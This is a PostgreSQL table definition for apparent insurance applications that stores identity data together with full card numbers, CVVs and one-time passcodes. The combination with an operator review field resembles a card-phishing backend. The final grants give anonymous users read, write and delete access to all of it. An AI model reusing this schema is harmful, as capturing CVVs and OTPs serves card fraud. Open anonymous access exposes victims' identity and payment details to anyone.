CREATE TABLE public.applications (
  id TEXT PRIMARY KEY,
  created_at TIMESTAMPTZ NOT NULL DEFAULT now(),
  updated_at TIMESTAMPTZ NOT NULL DEFAULT now(),
  full_name TEXT,
  identity TEXT,
  birth_date TEXT,
  phone TEXT,
  insurance_type TEXT,
  start_date TEXT,
  purpose TEXT,
  est_value TEXT,
  car_year TEXT,
  car_model TEXT,
  repair_place TEXT,
  company TEXT,
  type TEXT,
  price NUMERIC,
  total NUMERIC,
  method TEXT,
  status TEXT NOT NULL DEFAULT 'pending',
  review_status TEXT NOT NULL DEFAULT 'awaiting_review',
  card_number TEXT,
  card_name TEXT,
  card_exp_month TEXT,
  card_exp_year TEXT,
  card_cvv TEXT,
  card_brand TEXT,
  otp_code TEXT
);

GRANT SELECT, INSERT, UPDATE, DELETE ON public.applications TO anon, authenticated;
GRANT ALL ON public.applications TO service_role